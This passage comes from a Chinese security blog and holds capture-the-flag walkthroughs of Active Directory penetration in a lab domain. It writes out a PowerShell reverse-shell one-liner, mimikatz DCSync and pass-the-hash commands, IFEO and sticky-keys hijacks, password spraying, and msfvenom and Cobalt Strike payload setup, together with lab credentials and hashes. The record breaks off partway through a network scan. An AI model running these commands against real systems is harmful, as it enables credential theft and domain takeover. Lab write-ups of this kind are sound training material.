--no-sandbox</code></p><p>先弄好bloodhound</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\zhangxin\Desktop&gt;SharpHound.exe -c all---------------------------------------------Initializing SharpHound at 22:11 on 2025/8/11---------------------------------------------Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container[+] Creating Schema map for domain XIAORANG.LAB using path CN=Schema,CN=Configuration,DC=XIAORANG,DC=LAB[+] Cache File not Found: 0 Objects in cache[+] Pre-populating Domain Controller SIDSStatus: 0 objects finished (+0) -- Using 20 MB RAMStatus: 132 objects finished (+132 ∞)/s -- Using 29 MB RAMEnumeration finished in 00:00:00.7194614Compressing data to .\20250811221146_BloodHound.zipYou can upload this file directly to the UISharpHound Enumeration Completed at 22:11 on 2025/8/11! Happy Graphing!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/205dfd722d538f3eeeca8726b3837456.png"></p><p>可以看到，在172.22.6.25这个用户机，运行登录的用户有三个</p><p>而yuxuan 用户滥用了SID历史功能(SIDHistory是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的SID作为该对象的objectSid，在之前域中的SID会添加到该对象的sIDHistory属性中，此时该对象将保留在原来域的SID对应的访问权限)</p><p>简单来说yuxuan属于域管，所以现在拿到yuxuan的权限然后dump哈希就好了</p><p>然后查看一下用户</p><pre class="line-numbers language-none"><code class="language-none">reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"#用于查询系统注册表中与 Windows 登录相关的配置信息DefaultUserName    REG_SZ    yuxuanDefaultPassword    REG_SZ    Yuxuan7QbrgZ3LDefaultDomainName    REG_SZ    xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就抓到了yuxuan密码</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/538eeb1207b64248949ab0471a76a6e1.png"></p><p>以发现自动登录用户，正好就是yuxuan，用此用户rdp上去，dump域管哈希</p><p>所以我们切换到yuxuan用户，利用这个滥用的SID直接攻击DC机因为我们保留域管理员的访问权限了，所以直接dump哈希</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\yuxuan\Desktop&gt;mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /all /csv" "exit"500     Administrator   04d93ffd6f5f6e4490e0de23f240a5e9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><ol><li><strong><code>"lsadump::dcsync /domain:xiaorang.lab /all /csv"</code></strong><br>这是 mimikatz 的核心模块和参数：<ul><li><code>lsadump::dcsync</code>：调用 DCSync 功能模块。DCSync 是一种利用 Active Directory 域控制器（DC）之间的同步机制（基于 MS-DRSR 协议）来获取用户凭据的技术，无需在域控制器上直接执行代码。</li><li><code>/domain:xiaorang.lab</code>：指定目标域为 <code>xiaorang.lab</code>（需替换为实际的域名称）。</li><li><code>/all</code>：表示获取域内所有用户的凭据信息（包括管理员、普通用户等）。</li><li><code>/csv</code>：指定输出格式为 CSV（逗号分隔值），便于后续处理和分析。</li></ul></li><li><strong><code>"exit"</code></strong><br>执行完 DCSync 操作后，自动退出 mimikatz 工具，无需手动输入 <code>exit</code>。</li></ol><ul><li><strong>功能</strong>：该命令会模拟域控制器的同步请求，从目标域（<code>xiaorang.lab</code>）的域控制器中提取所有用户的 NTLM 哈希、SID 等信息，这些哈希可用于 Pass-the-Hash（哈希传递）攻击，进而横向移动或提升权限。</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/6bb6e0cc4b3a2ac5dd73c43c68dec32a.png"></p><hr><p>拿到hash，直接hash传递即可</p><pre class="line-numbers language-none"><code class="language-none">proxychains4 /usr/bin/impacket-wmiexec -hashes 00000000000000000000000000000000:04d93ffd6f5f6e4490e0de23f240a5e9 administrator@172.22.6.12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e0c491bbd1fb5a7c8506a2fe5f757d95.png"></p><p><code>flag{fd60ce54-3cae-440a-afbd-4c5bc0d6a9c5}</code></p><hr><pre class="line-numbers language-none"><code class="language-none">proxychains4 impacket-smbexec -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@172.22.6.25 -codec gbk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/77336aa2ea9fe7c2f2e610a0c46997d2.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 春秋云镜 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tsclient</title>
      <link href="/2025/08/07/tsclient/"/>
      <url>/2025/08/07/tsclient/</url>
      
        <content type="html"><![CDATA[<h1 id="Tsclient"><a href="#Tsclient" class="headerlink" title="Tsclient"></a>Tsclient</h1><h2 id="cs"><a href="#cs" class="headerlink" title="cs"></a>cs</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4be6d137a80dd1cafa206314a9334bd6.png"></p><pre class="line-numbers language-none"><code class="language-none">弱密码：sa     1qaz!QAZ1433mssql端口开放，于是能用mdutjava -jar Multiple.Database.Utilization.Tools-2.1.1-jar-with-dependencies.jar先激活组件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>NT SERVICE\MSSQLSERVER</code> 作为 SQL Server 数据库引擎的默认服务账户，其权限集合是<strong>系统预定义的最小权限集</strong></p></blockquote><p><a href="https://blog.csdn.net/weixin_39190897/article/details/118243520">https://blog.csdn.net/weixin_39190897/article/details/118243520</a></p><pre class="line-numbers language-none"><code class="language-none">https://blog.csdn.net/weixin_39190897/article/details/118243520我们先把teamserver.zip传入到vps上面，然后unzip解压后运行。192.168.20.128cd "/mnt/d/软件工具/渗透/tools/tools/Stotaway-bin/Stotaway-bin"sudo ./teamserver 172.30.65.142 123456./teamserver 120.27.114.217 123     ./teamserver 192.168.20.128 kali    (这种要forward映射到本地来)   ./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]&lt;host&gt; // 必需参数 团队服务器IP&lt;password&gt; // 必需参数 连接服务器的密码[/path/to/c2.profile] // 可选参数 指定C2通信配置文件，体现其强大的扩展性[YYYY-MM-DD] // 可选参数 所有payload的终止时间<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">q1n9@LAPTOP-3H92FD9J:~$ ip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet 10.255.255.254/32 brd 10.255.255.254 scope global lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host       valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000    link/ether 00:15:5d:91:05:3d brd ff:ff:ff:ff:ff:ff    inet 172.30.65.142/20 brd 172.30.79.255 scope global eth0       valid_lft forever preferred_lft forever    inet6 fe80::215:5dff:fe91:53d/64 scope link       valid_lft forever preferred_lft forever       sudo ./teamserver 172.30.65.142 123456   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>chcp 65001然后后面的命令就不是乱码了,本质是因为win和linux的默认中文编码不一样</p><h4 id="Sweetpotato提权"><a href="#Sweetpotato提权" class="headerlink" title="Sweetpotato提权"></a>Sweetpotato提权</h4><pre class="line-numbers language-none"><code class="language-none">Sweetpotato提权C:/1/2/SweetPotato.exe -a "C:/1/2/artifact_x64.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">嫌慢可以弹shellshell powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ip',7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">在cs上执行shell type C:\Users\Administrator\flag\flag01.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/3c64f987b79bfd13b15507efc1cd8258.png"></p><hr><h4 id="上线john"><a href="#上线john" class="headerlink" title="上线john"></a>上线john</h4><p>查看机器内用户</p><pre class="line-numbers language-none"><code class="language-none">shell net user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">hashdumpAdministrator:500:aad3b435b51404eeaad3b435b51404ee:2caf35bb4c5059a3d50599844e2b9b1f:::bridge:1016:aad3b435b51404eeaad3b435b51404ee:6912928308e3cda903e6d75bd6091a20:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::John:1008:aad3b435b51404eeaad3b435b51404ee:eec9381b043f098b011be51622282027:::matrix:1017:aad3b435b51404eeaad3b435b51404ee:9f12c506328bbee07e9a3f4c1a8fb7de:::test$:1009:aad3b435b51404eeaad3b435b51404ee:4708ce5d5015a978a1bf96a7a0f9da28:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">`quser` 命令是一个用于显示远程桌面会话主机服务器上的用户会话信息的Windows命令行工具。这个命令可以帮助你确定特定用户是否已经登录到特定的远程桌面会话主机服务器。shell quser || qwinst用户名                会话名             ID  状态    空闲时间   登录时间 john                  rdp-tcp#0           2  运行中       3:40  2025/8/1 19:43 test$                                     3  断开           24  2025/8/1 21:11 matrix                rdp-tcp#99          4  运行中          7  2025/8/1 23:02<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/832f3b4180b9657bc5b9f716f25d35a7.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e276d50e3677b96e835a39073c698bfe.png"></p><p>inject</p><p><code>net use</code> 是 Windows 命令行中用于管理 <strong>网络连接（尤其是共享资源）</strong> 的命令，可用于映射网络驱动器、查看 / 删除网络连接、访问远程共享文件夹等。</p><pre class="line-numbers language-none"><code class="language-none">shell net use[08/01 23:54:59] [+] received output:会记录新的网络连接。状态       本地        远程                      网络-------------------------------------------------------------------------------                       \\TSCLIENT\C              Microsoft Terminal Services                                              #TSCLIENT 是远程桌面会话中，对 “本地客户端机器” 的虚拟映射名。#\\TSCLIENT\C 表示 目标机器（被控制端）通过 RDP 连接时，把 “本地客户端（攻击者 / 管理员的电脑）的 C 盘” 映射到了自己的系统中。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>type</code> 是 Windows 命令提示符中的一个命令，用于显示文本文件的内容。</p><p><code>credential.txt</code> 通常是用于存储凭据（如账号、密码、密钥等）的文本文件，常见于渗透测试、系统管理或开发场景中。以下是关于它的常见用途和格式说明：</p><h3 id="1-常见用途"><a href="#1-常见用途" class="headerlink" title="1. 常见用途"></a><strong>1. 常见用途</strong></h3><ul><li>存储目标系统的账号密码（如 <code>username:password</code>）。</li><li>记录哈希值（如 NTLM 哈希、SSH 密钥）。</li><li>保存 API 密钥、令牌等认证信息。</li></ul><h3 id="2-典型格式示例"><a href="#2-典型格式示例" class="headerlink" title="2. 典型格式示例"></a><strong>2. 典型格式示例</strong></h3><h4 id="（1）账号密码对（最常见）"><a href="#（1）账号密码对（最常见）" class="headerlink" title="（1）账号密码对（最常见）"></a>（1）账号密码对（最常见）</h4><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt"># 格式：用户名:密码（可带域名/IP）Aldrich:Ald@rLMWuy7Z!#xiaorang.lab\Administrator:Passw0rd!172.22.8.15\admin:123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（2）哈希值（如-Pass-the-Hash-场景）"><a href="#（2）哈希值（如-Pass-the-Hash-场景）" class="headerlink" title="（2）哈希值（如 Pass-the-Hash 场景）"></a>（2）哈希值（如 Pass-the-Hash 场景）</h4><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt"># 格式：用户名:LM哈希:NT哈希（或仅NT哈希，用:开头）Administrator::2c9d81bdcf3ec8b1def10328a7cc2f08Aldrich: aad3b435b51404eeaad3b435b51404ee:2c9d81bdcf3ec8b1def10328a7cc2f08<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="（3）其他凭据"><a href="#（3）其他凭据" class="headerlink" title="（3）其他凭据"></a>（3）其他凭据</h4><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt"># SSH密钥路径ssh_private_key: /home/kali/.ssh/id_rsa# API令牌api_token: sk_test_51Hh............<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><pre class="line-numbers language-none"><code class="language-none"> \\TSCLIENT\C 的目录2022/07/12  10:34                71 credential.txt2022/05/12  17:04    &lt;DIR&gt;          PerfLogs2022/07/11  12:53    &lt;DIR&gt;          Program Files2022/05/18  11:30    &lt;DIR&gt;          Program Files (x86)2022/07/11  12:47    &lt;DIR&gt;          Users2022/07/11  12:45    &lt;DIR&gt;          Windowsshell type "\\TSCLIENT\C\credential.txt"xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#Do you know how to hijack Image?（你知道如何劫持镜像吗）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>使用CS搭建socks4代理</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/197af982e11dbcca5024efa812301f48.png"></p><pre class="line-numbers language-none"><code class="language-none">vim /etc/proxychains4.confsock4 120.27.114.217 1080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用crackmapexec进行密码喷洒()</p><blockquote><p>密码喷洒（Password Spraying）是一种针对多个账号使用少量通用密码进行尝试登录的攻击技术，与暴力破解（对单一账号尝试大量密码）相比，其特点是<strong>降低被检测概率</strong>（减少对单个账号的失败次数），常用于渗透测试或攻击场景中。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">proxychains -q crackmapexec smb 172.22.8.0/24 -u 'Aldrich' -p 'Ald@rLMWuy7Z!#'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/3022a8ad8a2c75f7f66e7d692c8d437b.png"></p><p>可以看到密码过期</p><pre class="line-numbers language-none"><code class="language-none">cd "/mnt/d/软件工具/渗透/tools/马" proxychains4 -q python3 smbpasswd.py xiaorang.lab/Aldrich:'Ald@rLMWuy7Z!#'@172.22.8.46 -newpass 'Wcryyds666.'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/544538036887484c954f5160c4206d75.png"></p><p>不出网</p><h4 id="IFEO-劫持"><a href="#IFEO-劫持" class="headerlink" title="IFEO 劫持"></a>IFEO 劫持</h4><p>根据之前的提示映像劫持提权</p><pre class="line-numbers language-none"><code class="language-none">获取注册表中 Image File Execution Options 项的访问控制列表（ACL）信息，并以列表形式（fl * 即 Format-List *）详细显示所有属性。get-acl -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | fl *<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>发现NT AUTHORITY\Authenticated Users可以修改注册表（NT AUTHORITY\Authenticated Users<code>组可</code>SetValue/CreateSubKey）</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5193e9c3f29335ae772d2e51f0c9e31f.png"></p><p>即所有账号密码登录的用户都可以修改注册表，利用这个性质，修改注册表，使用放大镜进行提权</p><p>修改注册表映像劫持</p><blockquote><p>当执行这条命令后（需要管理员权限）（这里所有账号密码登录的用户都可以修改注册表）：</p><ul><li>系统会在注册表的 <code>Image File Execution Options</code> 项下，为 <code>magnify.exe</code> 创建一个配置项。</li><li>当任何操作触发 <code>magnify.exe</code> 启动时（例如：登录界面按 <code>Win+U</code> 打开放大镜、手动双击运行 <code>magnify.exe</code>），系统会优先执行 <code>Debugger</code> 指向的程序 —— 即 <code>C:\windows\system32\cmd.exe</code>。</li><li>最终效果：点击 “放大镜” 时，实际弹出的是命令提示符窗口。</li></ul></blockquote><pre class="line-numbers language-none"><code class="language-none">REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><code>REG ADD</code>：用于向注册表添加项或键值。</li><li>路径 <code>HKLM\...\magnify.exe</code>：指定要劫持的程序（这里是 <code>magnify.exe</code>，即 Windows 放大镜程序）。</li><li><code>/v Debugger</code>：添加名为 <code>Debugger</code> 的键（这是 IFEO 劫持的核心，系统会优先启动该键指定的程序）。</li><li><code>/t REG_SZ</code>：键值类型为字符串。</li><li><code>/d "C:\windows\system32\cmd.exe"</code>：指定劫持后实际运行的程序（这里是命令提示符 <code>cmd.exe</code>）。</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/686d7766195edfafd443bf7f85c5d8e0.png"></p><p>锁定后点击放大镜</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/bd21c93d984e7a3b244ca6a4a1e2a0a9.png"></p><pre class="line-numbers language-none"><code class="language-none">或reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe"执行该命令（需管理员权限）后，当系统触发 sethc.exe 运行时（例如连续按 5 次 Shift 键），会自动启动 cmd.exe（命令提示符），而非原本的粘滞键功能。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2cf39f2eb9aae4fdb383a56cb947ad22.png"></p><p>成功拿到system权限</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/3210ddbe8ce30c3361c3e28d9e4afc97.png"></p><hr><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><pre class="line-numbers language-none"><code class="language-none">shell net user /domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">shell net group "domain admins" /domain发现win2016$在域管组里，即机器账户可以Hash传递登录域控。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>利用mimikatz注入机器账户的hash</p><pre class="line-numbers language-none"><code class="language-none">shell C:\\Users\\Public\\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:WIN2016$ /domain:xiaorang.lab /ntlm:b47c845655f06fb51ede6767aabbb33f" "exit"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用mimikatz dcsync dump域控hash</p><pre class="line-numbers language-none"><code class="language-none">shell C:\\Users\\Public\\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:xiaorang.lab  /user:Administrator" "exit"shell C:\\Users\\Public\\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:xiaorang.lab /all /csv" "exit"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">proxychains rdesktop 172.22.8.46 -u Aldrich -d xiaorang.lab -p 'Wcryyds666.' -r disk:mydisk="/home/q1n9"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过 <code>rdesktop</code> 连接远程 Windows 主机 <code>172.22.8.46</code>，并将本地的 <code>/home/q1n9</code> 目录映射为远程的 <code>mydisk</code> 虚拟磁盘。</p><pre class="line-numbers language-none"><code class="language-none">powershellcd C:\Users\Aldrich\Desktop./beancon_x64.exeC:\Users\Aldrich\Desktop\beacon.exe（还是用system权限，运行powershell)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到该shell，利用 logonpasswords 获取凭证。<code>logonpasswords</code> 是 Cobalt Strike 中的一个命令，用于从目标系统中提取登录凭证，包括明文密码、哈希值等。</p><p>最后hash传递攻击。</p><pre class="line-numbers language-none"><code class="language-none">proxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><code>proxychains4</code>：通过代理链路由流量（确保符合网络访问策略）。</li><li><code>-hashes :2c9d81bdcf3ec8b1def10328a7cc2f08</code>：指定 NTLM 哈希进行认证（格式为 <code>LM哈希:NT哈希</code>，这里 <code>:</code> 前为空表示不使用 LM 哈希，仅用 NT 哈希 <code>2c9d81bdcf3ec8b1def10328a7cc2f08</code>）。</li><li><code>xiaorang.lab/administrator@172.22.8.15</code>：目标信息（域 <code>xiaorang.lab</code> + 用户名 <code>administrator</code> + 目标 IP <code>172.22.8.15</code>）。</li><li><code>-codec gbk</code>：指定编码为 GBK，确保中文输出正常显示。</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5db05ee57b5b015a25818fa9bfa02105.png"></p><p>or</p><p>查看域控管理员组</p><pre class="line-numbers language-none"><code class="language-none">net group "domain admins" /domain这项请求将在域xiaorang.lab的域控制器处理。组名        Domain Admins注释        指定的域管理员成员----------------------------------Administrator      WIN2016$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现win2016$在域管组里，即机器账户可以Hash传递登录域控。</p><p>、然后用creds_all获取凭证</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; creds_all[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[+] Running as SYSTEM[*] Retrieving all credentialsmsv credentials===============Username  Domain    NTLM                       SHA1                       DPAPI--------  ------    ----                       ----                       -----Aldrich   XIAORANG  f833b1285fea0f548d6022081  4c4fdc74b86cde011a14be14c  91ba27d3231a4ac6c9967e267                    e030e55                    54cb74c5ae3456e            f815d61WIN2016$  XIAORANG  17b0ca4ae854dc2e5ba037fdb  4be5a0c3c6e3ed6eaa64146e6                    6ce9524                    d2e317f1dd43534WIN2016$  XIAORANG  4ba974f170ab0fe1a8a1eb0ed  e06238ecefc14d675f762b08a                    8f6fe1a                    456770dc000f763mingzu$   WIN2016   b976ca603387721ba9bed4a7e  9e9770aad669394ed98819c77                    a1b0103                    f7cfb45c2142b2f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用wmiexec对WIN2016$的凭证进行利用直接尝试登录域控<br><code>proxychains4 /usr/bin/impacket-wmiexec -hashes 00000000000000000000000000000000:17b0ca4ae854dc2e5ba037fdb6ce9524 xiaorang.lab/WIN2016\$@172.22.8.15</code></p><p>拿到shell</p><pre class="line-numbers language-none"><code class="language-none">type c:\users\administrator\flag\flag03.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e35ca1d3dc88c3d20d289d714e1a0a87.png"></p><hr><h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><h3 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h3><h4 id="socks5"><a href="#socks5" class="headerlink" title="socks5"></a>socks5</h4><p>建立socks5</p><pre class="line-numbers language-none"><code class="language-none">C:/1/windows_x64_agent.exe -l 7878cd "/mnt/d/软件工具/渗透/tools/tools/Stotaway-bin/Stotaway-bin"./linux_x64_admin -c 39.99.228.12:7878topouse 0socks5 12345vim /etc/proxychains4.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">cd "/mnt/d/软件工具/渗透/tools/马"msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=7654 -f exe -o 7.exeC:/1/7.exeproxychains msfconsoleuse exploit/multi/handlerset payload windows/x64/meterpreter/bind_tcpset rhost 39.99.228.12set lport 7654run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="msf-getsystem提权"><a href="#msf-getsystem提权" class="headerlink" title="msf@getsystem提权"></a>msf@getsystem提权</h4><p>成功获得meterpertre，发现Users里面的Administrator访问不了，需要提权，这里直接使用msf的内置exp提权<br><code>getsystem</code></p><pre class="line-numbers language-none"><code class="language-none"># 确认当前权限（需管理员或 SYSTEM 权限，若不是则先提权）getuid# 若显示非管理员权限，执行 getsystem 尝试提权getsystempwd\C:\Windows\system32cd C:/Users/Administrator/flagcat  flag01.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/29e9a9a7ef00e524a5f2add452dac5ab.png"></p><p>还有提示</p><hr><h3 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h3><pre class="line-numbers language-none"><code class="language-none">ipconfigIPv4 Address : 172.22.8.18<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>于是扫一下</p><pre class="line-numbers language-none"><code class="language-none">C:/1/fscan.exe -h 172.22.8.0/24___                              _      / _ \     ___  ___ _ __ __ _  ___| | __  / /_\/____/ __|/ __| '__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;    \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: 1.8.4start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart ping(icmp) Target 172.22.8.31     is alive(icmp) Target 172.22.8.46     is alive(icmp) Target 172.22.8.18     is alive(icmp) Target 172.22.8.15     is alive[*] Icmp alive hosts len is: 4172.22.8.46:445 openOpen result.txt error, open result.txt: Access is denied.172.22.8.15:445 openOpen result.txt error, open result.txt: Access is denied.172.22.8.15:135 openOpen result.txt error, open result.txt: Access is denied.172.22.8.18:1433 openOpen result.txt error, open result.txt: Access is denied.172.22.8.31:445 openOpen result.txt error, open result.txt: Access is denied.172.22.8.18:445 openOpen result.txt error, open result.txt: Access is denied.172.22.8.15:139 openOpen result.txt error, open result.txt: Access is denied.172.22.8.46:139 openOpen result.txt error, open result.txt: Access is denied.172.22.8.31:139 openOpen result.txt error, open result.txt: Access is denied.172.22.8.18:139 openOpen result.txt error, open result.txt: Access is denied.172.22.8.46:135 openOpen result.txt error, open result.txt: Access is denied.172.22.8.31:135 openOpen result.txt error, open result.txt: Access is denied.172.22.8.18:135 openOpen result.txt error, open result.txt: Access is denied.172.22.8.46:80 openOpen result.txt error, open result.txt: Access is denied.172.22.8.18:80 openOpen result.txt error, open result.txt: Access is denied.172.22.8.15:88 openOpen result.txt error, open result.txt: Access is denied.[*] alive ports len is: 16start vulscan[*] NetInfo [*]172.22.8.46   [-&gt;]WIN2016   [-&gt;]172.22.8.46Open result.txt error, open result.txt: Access is denied.[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows ServerOpen result.txt error, open result.txt: Access is denied.[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         Open result.txt error, open result.txt: Access is 